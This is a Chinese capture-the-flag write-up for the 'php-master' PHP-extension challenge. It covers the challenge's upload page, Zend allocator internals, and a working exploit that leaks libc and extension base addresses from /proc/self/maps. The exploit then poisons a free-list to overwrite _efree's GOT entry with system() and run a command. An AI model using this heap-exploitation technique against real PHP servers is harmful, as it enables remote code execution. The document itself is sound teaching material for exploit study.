# 长城杯2025 (php-pwn) simi-final php-master 详解

> 原文: https://www.ctfiot.com/249023.html
> ID: 249023

docker load -i php-master.tar
docker run -it your_image_id  /bin/bash

find . | grep "extensions"

# 版本号
version: '3'
#启动的服务
services:
#服务名
  php-master:
#镜像
    image: php-master:attachment-v1
#映射的端口，
    ports:
      - "80:80"
      - "28888:9191"# 将主机的28888端口映射到容器中的9191端口
#文件夹映射  将当前主机目录下的data文件夹作为共享文件夹，映射到容器中的/var/www/html/exp文件夹中
    volumes:
      - ./data:/var/www/html/exp

<?php
@error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
if (isset($_FILES['file'])) {
$file = $_FILES['file'];

$upload_dir = '';
$target_file = $upload_dir . basename($file['name']);

$result = move_uploaded_file($file['tmp_name'], $target_file);

if ($result) {
$message = '文件上传成功！';
$msg_class = 'success';
        } else {
$message = '文件上传失败';
$msg_class = 'error';
        }
    } else {
$message = '没有选择要上传的文件';
$msg_class = 'error';
    }
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>PHP MASTER</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
        }
        .upload-box {
            border: 2px dashed #ccc;
            padding: 30px;
            text-align: center;
        }
        .btn {
            background: #007bff;
            color: white;
            padding: 10px20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn:hover {
            background: #0056b3;
        }
        .message {
            padding: 15px;
            margin: 20px0;
            border-radius: 4px;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <h2>PHP MASTER</h2>

    <?php if (isset($message)): ?>
        <div class="message <?php echo$msg_class; ?>">
            <?php echo$message; ?>
        </div>
    <?php endif; ?>

    <form action="" method="post" enctype="multipart/form-data" class="upload-box">
        <p>请选择要上传的文件：</p>
        <input type="file" name="file" required>
        <br><br>
        <button type="submit" class="btn">上传文件</button>
    </form>
</body>
</html>

ZEND_API int zend_parse_parameters(int num_args, const char *type_spec, ...);

参数

说明

PHP 调用时实际传入参数的数量，一般用ZEND_NUM_ARGS()

参数类型字符串，例如"ll"表示两个 long 类型

用于接收解析结果的变量的地址（按顺序传入）

字符

含义

C 变量类型

long / int（整型）

double（浮点型）

字符串（和长度）

,size_t

bool

zval *（通用）

数组

对象

`

`

可选参数的分隔符

struct_zend_mm_heap {
#if ZEND_MM_CUSTOM
    int                use_custom_heap;
#endif
#if ZEND_MM_STORAGE
    zend_mm_storage   *storage;
#endif
#if ZEND_MM_STAT
    size_t             size;                    /* current memory usage */
    size_t             peak;                    /* peak memory usage */
#endif
    zend_mm_free_slot *free_slot[ZEND_MM_BINS]; /* free lists for small sizes */
#if ZEND_MM_STAT || ZEND_MM_LIMIT
    size_t             real_size;               /* current size of allocated pages */
#endif
#if ZEND_MM_STAT
    size_t             real_peak;               /* peak size of allocated pages */
#endif
#if ZEND_MM_LIMIT
    size_t             limit;                   /* memory limit */
    int                overflow;                /* memory overflow flag */
#endif

    zend_mm_huge_list *huge_list;               /* list of huge allocated blocks */

    zend_mm_chunk     *main_chunk;
    zend_mm_chunk     *cached_chunks; /* list of unused chunks */
    int                chunks_count; /* number of allocated chunks */
    int                peak_chunks_count; /* peak number of allocated chunks for current request */
    int                cached_chunks_count; /* number of cached chunks */
    double             avg_chunks_count; /* average number of chunks allocated per request */
    int                last_chunks_delete_boundary; /* number of chunks after last deletion */
    int                last_chunks_delete_count;    /* number of deletion over the last boundary */
#if ZEND_MM_CUSTOM
union {
struct {
            void      *(*_malloc)(size_t);
void       (*_free)(void*);
            void      *(*_realloc)(void*, size_t);
        } std;
struct {
            void      *(*_malloc)(size_t ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
void       (*_free)(void*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
            void      *(*_realloc)(void*, size_t  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
        } debug;
    } custom_heap;
    HashTable *tracked_allocs;
#endif
};

struct_zend_mm_chunk {
    zend_mm_heap      *heap;
    zend_mm_chunk     *next;
    zend_mm_chunk     *prev;
    uint32_t           free_pages; /* number of free pages */
    uint32_t           free_tail;               /* number of free pages at the end of chunk */
    uint32_t           num;
    char               reserve[64 - (sizeof(void*) * 3 + sizeof(uint32_t) * 3)];
    zend_mm_heap       heap_slot;               /* used only in main chunk */
    zend_mm_page_map   free_map;                /* 512 bits or 64 bytes */
    zend_mm_page_info  map[ZEND_MM_PAGES];      /* 2 KB = 512 * 4 */
};

ZEND_API void* ZEND_FASTCALL _emalloc(size_t size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
#if ZEND_MM_CUSTOM 
//如果采用自定义
if (UNEXPECTED(AG(mm_heap)->use_custom_heap)) {
return _malloc_custom(size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
    }
#endif
//默认的php zend引擎管理器
returnzend_mm_alloc_heap(AG(mm_heap), size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
}

/*
 * bin - is one or few continuous pages (up to 8) used for allocation of
 * a particular "small size".
 */
struct_zend_mm_bin {
    char               bytes[ZEND_MM_PAGE_SIZE * 8];
};

struct_zend_mm_free_slot {
    zend_mm_free_slot *next_free_slot;
};

static zend_always_inline void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
    void *ptr;
#if ZEND_DEBUG
    size_t real_size = size;
    zend_mm_debug_info *dbg;

/* special handling for zero-size allocation */
    size = MAX(size, 1);
    size = ZEND_MM_ALIGNED_SIZE(size) + ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info));
if (UNEXPECTED(size < real_size)) {
zend_error_noreturn(E_ERROR, "Possible integer overflow in memory allocation (%zu + %zu)", ZEND_MM_ALIGNED_SIZE(real_size), ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
returnNULL;
    }
#endif
if (EXPECTED(size <= ZEND_MM_MAX_SMALL_SIZE)) {
        ptr = zend_mm_alloc_small(heap, ZEND_MM_SMALL_SIZE_TO_BIN(size) ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#if ZEND_DEBUG
        dbg = zend_mm_get_debug_info(heap, ptr);
        dbg->size = real_size;
        dbg->filename = __zend_filename;
        dbg->orig_filename = __zend_orig_filename;
        dbg->lineno = __zend_lineno;
        dbg->orig_lineno = __zend_orig_lineno;
#endif
return ptr;
    } elseif (EXPECTED(size <= ZEND_MM_MAX_LARGE_SIZE)) {
        ptr = zend_mm_alloc_large(heap, size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#if ZEND_DEBUG
        dbg = zend_mm_get_debug_info(heap, ptr);
        dbg->size = real_size;
        dbg->filename = __zend_filename;
        dbg->orig_filename = __zend_orig_filename;
        dbg->lineno = __zend_lineno;
        dbg->orig_lineno = __zend_orig_lineno;
#endif
return ptr;
    } else {
#if ZEND_DEBUG
        size = real_size;
#endif
returnzend_mm_alloc_huge(heap, size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
    }
}

static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
#if ZEND_MM_STAT
//获取页之类的操作？给整个heap管理结构体更新信息
do {
        size_t size = heap->size + bin_data_size[bin_num];
        size_t peak = MAX(heap->peak, size);
        heap->size = size;
        heap->peak = peak;
    } while (0);
#endif
// 如果free_list里有东西，直接取出来，更新free_list
if (EXPECTED(heap->free_slot[bin_num] != NULL)) {
        zend_mm_free_slot *p = heap->free_slot[bin_num];
        heap->free_slot[bin_num] = p->next_free_slot;
return p;
    } else {
//否则走这边
returnzend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
    }
}

static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint32_t bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
    zend_mm_chunk *chunk;
    int page_num;
    zend_mm_bin *bin;
    zend_mm_free_slot *p, *end;

#if ZEND_DEBUG
    bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num], bin_data_size[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#else
//申请页内存给到bin
    bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#endif
if (UNEXPECTED(bin == NULL)) {
/* insufficient memory */
returnNULL;
    }

    chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);
    page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;
    chunk->map[page_num] = ZEND_MM_SRUN(bin_num);
if (bin_pages[bin_num] > 1) {
        uint32_t i = 1;

do {
            chunk->map[page_num+i] = ZEND_MM_NRUN(bin_num, i);
            i++;
        } while (i < bin_pages[bin_num]);
    }

/* create a linked list of elements from 1 to last */
//把 bin 从头开始切割成一段段小块，构建一个 free_slot 链表，挂到 heap->free_slot[bin_num] 上。
    end = (zend_mm_free_slot*)((char*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - 1)));
    heap->free_slot[bin_num] = p = (zend_mm_free_slot*)((char*)bin + bin_data_size[bin_num]);
do {
        p->next_free_slot = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
#if ZEND_DEBUG
do {
            zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
            dbg->size = 0;
        } while (0);
#endif
        p = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
    } while (p != end);

/* terminate list using NULL */
    p->next_free_slot = NULL;
#if ZEND_DEBUG
do {
            zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
            dbg->size = 0;
        } while (0);
#endif

/* return first element */
return bin;
}

ZEND_API void ZEND_FASTCALL _efree(void *ptr ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
#if ZEND_MM_CUSTOM
    if (UNEXPECTED(AG(mm_heap)->use_custom_heap)) {
_efree_custom(ptr ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
        return;
    }
#endif
zend_mm_free_heap(AG(mm_heap), ptr ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
}

static zend_always_inline voidzend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num)
{
    zend_mm_free_slot *p;

#if ZEND_MM_STAT
    heap->size -= bin_data_size[bin_num];
#endif

#if ZEND_DEBUG
do {
        zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
        dbg->size = 0;
    } while (0);
#endif

    p = (zend_mm_free_slot*)ptr;
    p->next_free_slot = heap->free_slot[bin_num];
    heap->free_slot[bin_num] = p;
}

./gdbserver-7.10.1-x64 :9191 php -S 0:80 exp.php

$map_file = "/proc/self/map";
$system_off = 0x44AF0;
$libc_base = 0;
$vuln_so_base = 0;
$efree_got = 0x4060;

functionget_so_base($buffer){
global$libc_base;
global$vuln_so_base;
$libc_line_regex = "/([0-9a-f]+)-[0-9a-f]+ .* /lib/x86_64-linux-gnu/libc-2.28.so/";
$vuln_so_line_regex =
"/([0-9a-f]+)-[0-9a-f]+ .* /usr/local/lib/php/extensions/no-debug-non-zts-[0-9]+/vuln.so/";
if (preg_match_all($libc_line_regex, $buffer, $matches))
$libc_base = hexdec($matches[1][0]);
else
echo"Failed to get libc base";
if (preg_match_all($vuln_so_line_regex, $buffer, $matches))
$vuln_so_base = hexdec($matches[1][0]);
else
echo"Failed to get vuln.so base";
}

ob_start();
include"/proc/self/maps";
$buffer = ob_get_contents();
ob_end_flush();
get_so_base($buffer);
$efree_got += $vuln_so_base;

echo"libc base address: " . dechex($libc_base) . "n<br>";
echo"vuln.so base address: " . dechex($vuln_so_base) . "n<br>";
echo"_efree.got: " . dechex($efree_got) . "n<br>";

construct(0x10);
allocate(0,0x30);
allocate(1,0x30);
clear();
overwrite(1,p64($efree_got));
# 这里再初始化一次确保init为1 否则无法allocate
construct(0x10);

allocate(0,0x30);
allocate(1,0x30);

overwrite(0,"/readflag>/var/www/html/flagx00");

overwrite(1,p64($libc_base + $system_off));
clear();

# 版本号
version: '3'
#启动的服务
services:
#服务名
  php-master:
#镜像
    image: php-master:attachment-v1
#映射的端口，
    ports:
      - "80:80"# 用于映射上传服务
      - "28888:9191"# 将主机的28888端口映射到容器中的9191端口 用于gdbserver本地连容器
      - "1111:8080"# 用于触发exp.php 调试
#文件夹映射  将当前主机目录下的data文件夹作为共享文件夹，映射到容器中的/var/www/html/exp文件夹中
    volumes:
      - ./data:/var/www/html/exp

看雪ID：sparkle666

https://bbs.kanxue.com/user-home-1010243.htm

*本文为看雪论坛优秀文章，由 sparkle666 原创，转载请注明来自看雪社区

# 往期推荐

1、安卓壳学习记录（下）-某加固免费版分析

2、逆向分析：Win10 ObRegisterCallbacks的相关分析

3、VMP入门：VMP1.81 Demo分析

4、腾讯2025游戏安全PC方向初赛题解

5、OLLVM 攻略笔记

6、安卓壳学习记录（上）

球分享

球点赞

球在看

点击阅读原文查看更多


```
docker load -i php-master.tar
docker run -it your_image_id  /bin/bash
```



```
find . | grep "extensions"
```



```
# 版本号
version: '3'
#启动的服务
services:
#服务名
  php-master:
#镜像
    image: php-master:attachment-v1
#映射的端口，
    ports:
      - "80:80"
      - "28888:9191"# 将主机的28888端口映射到容器中的9191端口
#文件夹映射  将当前主机目录下的data文件夹作为共享文件夹，映射到容器中的/var/www/html/exp文件夹中
    volumes:
      - ./data:/var/www/html/exp
```



```
<?php
@error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
if (isset($_FILES['file'])) {
$file = $_FILES['file'];

$upload_dir = '';
$target_file = $upload_dir . basename($file['name']);

$result = move_uploaded_file($file['tmp_name'], $target_file);

if ($result) {
$message = '文件上传成功！';
$msg_class = 'success';
        } else {
$message = '文件上传失败';
$msg_class = 'error';
        }
    } else {
$message = '没有选择要上传的文件';
$msg_class = 'error';
    }
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>PHP MASTER</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
        }
        .upload-box {
            border: 2px dashed #ccc;
            padding: 30px;
            text-align: center;
        }
        .btn {
            background: #007bff;
            color: white;
            padding: 10px20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn:hover {
            background: #0056b3;
        }
        .message {
            padding: 15px;
            margin: 20px0;
            border-radius: 4px;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <h2>PHP MASTER</h2>

    <?php if (isset($message)): ?>
        <div class="message <?php echo$msg_class; ?>">
            <?php echo$message; ?>
        </div>
    <?php endif; ?>

    <form action="" method="post" enctype="multipart/form-data" class="upload-box">
        <p>请选择要上传的文件：</p>
        <input type="file" name="file" required>
        <br><br>
        <button type="submit" class="btn">上传文件</button>
    </form>
</body>
</html>
```



```
ZEND_API int zend_parse_parameters(int num_args, const char *type_spec, ...);
```



```
struct_zend_mm_heap {
#if ZEND_MM_CUSTOM
    int                use_custom_heap;
#endif
#if ZEND_MM_STORAGE
    zend_mm_storage   *storage;
#endif
#if ZEND_MM_STAT
    size_t             size;                    /* current memory usage */
    size_t             peak;                    /* peak memory usage */
#endif
    zend_mm_free_slot *free_slot[ZEND_MM_BINS]; /* free lists for small sizes */
#if ZEND_MM_STAT || ZEND_MM_LIMIT
    size_t             real_size;               /* current size of allocated pages */
#endif
#if ZEND_MM_STAT
    size_t             real_peak;               /* peak size of allocated pages */
#endif
#if ZEND_MM_LIMIT
    size_t             limit;                   /* memory limit */
    int                overflow;                /* memory overflow flag */
#endif

    zend_mm_huge_list *huge_list;               /* list of huge allocated blocks */

    zend_mm_chunk     *main_chunk;
    zend_mm_chunk     *cached_chunks; /* list of unused chunks */
    int                chunks_count; /* number of allocated chunks */
    int                peak_chunks_count; /* peak number of allocated chunks for current request */
    int                cached_chunks_count; /* number of cached chunks */
    double             avg_chunks_count; /* average number of chunks allocated per request */
    int                last_chunks_delete_boundary; /* number of chunks after last deletion */
    int                last_chunks_delete_count;    /* number of deletion over the last boundary */
#if ZEND_MM_CUSTOM
union {
struct {
            void      *(*_malloc)(size_t);
void       (*_free)(void*);
            void      *(*_realloc)(void*, size_t);
        } std;
struct {
            void      *(*_malloc)(size_t ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
void       (*_free)(void*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
            void      *(*_realloc)(void*, size_t  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
        } debug;
    } custom_heap;
    HashTable *tracked_allocs;
#endif
};
```



```
struct_zend_mm_chunk {
    zend_mm_heap      *heap;
    zend_mm_chunk     *next;
    zend_mm_chunk     *prev;
    uint32_t           free_pages; /* number of free pages */
    uint32_t           free_tail;               /* number of free pages at the end of chunk */
    uint32_t           num;
    char               reserve[64 - (sizeof(void*) * 3 + sizeof(uint32_t) * 3)];
    zend_mm_heap       heap_slot;               /* used only in main chunk */
    zend_mm_page_map   free_map;                /* 512 bits or 64 bytes */
    zend_mm_page_info  map[ZEND_MM_PAGES];      /* 2 KB = 512 * 4 */
};
```



```
ZEND_API void* ZEND_FASTCALL _emalloc(size_t size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
#if ZEND_MM_CUSTOM 
//如果采用自定义
if (UNEXPECTED(AG(mm_heap)->use_custom_heap)) {
return _malloc_custom(size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
    }
#endif
//默认的php zend引擎管理器
returnzend_mm_alloc_heap(AG(mm_heap), size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
}
```



```
/*
 * bin - is one or few continuous pages (up to 8) used for allocation of
 * a particular "small size".
 */
struct_zend_mm_bin {
    char               bytes[ZEND_MM_PAGE_SIZE * 8];
};

struct_zend_mm_free_slot {
    zend_mm_free_slot *next_free_slot;
};
```



```
static zend_always_inline void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
    void *ptr;
#if ZEND_DEBUG
    size_t real_size = size;
    zend_mm_debug_info *dbg;

/* special handling for zero-size allocation */
    size = MAX(size, 1);
    size = ZEND_MM_ALIGNED_SIZE(size) + ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info));
if (UNEXPECTED(size < real_size)) {
zend_error_noreturn(E_ERROR, "Possible integer overflow in memory allocation (%zu + %zu)", ZEND_MM_ALIGNED_SIZE(real_size), ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
returnNULL;
    }
#endif
if (EXPECTED(size <= ZEND_MM_MAX_SMALL_SIZE)) {
        ptr = zend_mm_alloc_small(heap, ZEND_MM_SMALL_SIZE_TO_BIN(size) ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#if ZEND_DEBUG
        dbg = zend_mm_get_debug_info(heap, ptr);
        dbg->size = real_size;
        dbg->filename = __zend_filename;
        dbg->orig_filename = __zend_orig_filename;
        dbg->lineno = __zend_lineno;
        dbg->orig_lineno = __zend_orig_lineno;
#endif
return ptr;
    } elseif (EXPECTED(size <= ZEND_MM_MAX_LARGE_SIZE)) {
        ptr = zend_mm_alloc_large(heap, size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#if ZEND_DEBUG
        dbg = zend_mm_get_debug_info(heap, ptr);
        dbg->size = real_size;
        dbg->filename = __zend_filename;
        dbg->orig_filename = __zend_orig_filename;
        dbg->lineno = __zend_lineno;
        dbg->orig_lineno = __zend_orig_lineno;
#endif
return ptr;
    } else {
#if ZEND_DEBUG
        size = real_size;
#endif
returnzend_mm_alloc_huge(heap, size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
    }
}
```



```
static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
#if ZEND_MM_STAT
//获取页之类的操作？给整个heap管理结构体更新信息
do {
        size_t size = heap->size + bin_data_size[bin_num];
        size_t peak = MAX(heap->peak, size);
        heap->size = size;
        heap->peak = peak;
    } while (0);
#endif
// 如果free_list里有东西，直接取出来，更新free_list
if (EXPECTED(heap->free_slot[bin_num] != NULL)) {
        zend_mm_free_slot *p = heap->free_slot[bin_num];
        heap->free_slot[bin_num] = p->next_free_slot;
return p;
    } else {
//否则走这边
returnzend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
    }
}
```



```
static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint32_t bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
    zend_mm_chunk *chunk;
    int page_num;
    zend_mm_bin *bin;
    zend_mm_free_slot *p, *end;

#if ZEND_DEBUG
    bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num], bin_data_size[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#else
//申请页内存给到bin
    bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#endif
if (UNEXPECTED(bin == NULL)) {
/* insufficient memory */
returnNULL;
    }

    chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);
    page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;
    chunk->map[page_num] = ZEND_MM_SRUN(bin_num);
if (bin_pages[bin_num] > 1) {
        uint32_t i = 1;

do {
            chunk->map[page_num+i] = ZEND_MM_NRUN(bin_num, i);
            i++;
        } while (i < bin_pages[bin_num]);
    }

/* create a linked list of elements from 1 to last */
//把 bin 从头开始切割成一段段小块，构建一个 free_slot 链表，挂到 heap->free_slot[bin_num] 上。
    end = (zend_mm_free_slot*)((char*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - 1)));
    heap->free_slot[bin_num] = p = (zend_mm_free_slot*)((char*)bin + bin_data_size[bin_num]);
do {
        p->next_free_slot = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
#if ZEND_DEBUG
do {
            zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
            dbg->size = 0;
        } while (0);
#endif
        p = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
    } while (p != end);

/* terminate list using NULL */
    p->next_free_slot = NULL;
#if ZEND_DEBUG
do {
            zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
            dbg->size = 0;
        } while (0);
#endif

/* return first element */
return bin;
}
```



```
ZEND_API void ZEND_FASTCALL _efree(void *ptr ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
#if ZEND_MM_CUSTOM
    if (UNEXPECTED(AG(mm_heap)->use_custom_heap)) {
_efree_custom(ptr ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
        return;
    }
#endif
zend_mm_free_heap(AG(mm_heap), ptr ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
}
```



```
static zend_always_inline voidzend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num)
{
    zend_mm_free_slot *p;

#if ZEND_MM_STAT
    heap->size -= bin_data_size[bin_num];
#endif

#if ZEND_DEBUG
do {
        zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
        dbg->size = 0;
    } while (0);
#endif

    p = (zend_mm_free_slot*)ptr;
    p->next_free_slot = heap->free_slot[bin_num];
    heap->free_slot[bin_num] = p;
}
```



```
./gdbserver-7.10.1-x64 :9191 php -S 0:80 exp.php
```



```
$map_file = "/proc/self/map";
$system_off = 0x44AF0;
$libc_base = 0;
$vuln_so_base = 0;
$efree_got = 0x4060;

functionget_so_base($buffer){
global$libc_base;
global$vuln_so_base;
$libc_line_regex = "/([0-9a-f]+)-[0-9a-f]+ .* /lib/x86_64-linux-gnu/libc-2.28.so/";
$vuln_so_line_regex =
"/([0-9a-f]+)-[0-9a-f]+ .* /usr/local/lib/php/extensions/no-debug-non-zts-[0-9]+/vuln.so/";
if (preg_match_all($libc_line_regex, $buffer, $matches))
$libc_base = hexdec($matches[1][0]);
else
echo"Failed to get libc base";
if (preg_match_all($vuln_so_line_regex, $buffer, $matches))
$vuln_so_base = hexdec($matches[1][0]);
else
echo"Failed to get vuln.so base";
}

ob_start();
include"/proc/self/maps";
$buffer = ob_get_contents();
ob_end_flush();
get_so_base($buffer);
$efree_got += $vuln_so_base;

echo"libc base address: " . dechex($libc_base) . "n<br>";
echo"vuln.so base address: " . dechex($vuln_so_base) . "n<br>";
echo"_efree.got: " . dechex($efree_got) . "n<br>";
```



```
construct(0x10);
allocate(0,0x30);
allocate(1,0x30);
clear();
overwrite(1,p64($efree_got));
# 这里再初始化一次确保init为1 否则无法allocate
construct(0x10);

allocate(0,0x30);
allocate(1,0x30);

overwrite(0,"/readflag>/var/www/html/flagx00");

overwrite(1,p64($libc_base + $system_off));
clear();
```



```
# 版本号
version: '3'
#启动的服务
services:
#服务名
  php-master:
#镜像
    image: php-master:attachment-v1
#映射的端口，
    ports:
      - "80:80"# 用于映射上传服务
      - "28888:9191"# 将主机的28888端口映射到容器中的9191端口 用于gdbserver本地连容器
      - "1111:8080"# 用于触发exp.php 调试
#文件夹映射  将当前主机目录下的data文件夹作为共享文件夹，映射到容器中的/var/www/html/exp文件夹中
    volumes:
      - ./data:/var/www/html/exp
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748087429-wxsync-2025-05-1cb058bef90764293c2f029dc1249891.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748087431-wxsync-2025-05-51c530d64bb20258e77f150caafbad9f.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748087433-wxsync-2025-05-9923717ee90b1c70c0862a04e115aa94.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748087436-wxsync-2025-05-6af0cb183fcccddee46b39d5b16e2425.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748087438-wxsync-2025-05-0fca7c745fa25f352abb3126e371a8c5.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748087440-wxsync-2025-05-54262ede7dadacc9ea2b638617acfa10.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748087443-wxsync-2025-05-c6fd8df2de2cf26928034d8afad18dad.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748087444-wxsync-2025-05-230286fcc5f51de5cd4a86dabfba7fc3.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748087447-wxsync-2025-05-8019642f9c4d7e7206d7b86401400e63.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748087450-wxsync-2025-05-8d16dcc55d41872b25f03c42da92d60b.jpg)